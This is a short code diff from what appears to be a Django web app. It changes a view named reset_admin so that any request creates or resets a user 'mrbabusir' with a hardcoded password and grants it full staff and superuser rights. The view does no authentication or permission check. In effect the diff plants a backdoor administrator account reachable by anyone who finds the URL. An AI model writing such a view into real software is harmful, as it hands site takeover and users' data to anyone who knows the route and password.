@@ -276,10 +276,13 @@ def product_detail(request, product_id):
     })
 
 def reset_admin(request):
-    try:
-        user = User.objects.get(username='mrbabusir')
-        user.set_password('NewPassword456!')
-        user.save()
-        return HttpResponse("Password reset successfully!")
-    except User.DoesNotExist:
-        return HttpResponse("User not found!")
+    from django.contrib.auth.models import User
+    user, created = User.objects.get_or_create(username='mrbabusir')
+    user.set_password('NewPassword456!')
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+    if created:
+        return HttpResponse("Superuser created!")
+    return HttpResponse("Password reset successfully!")
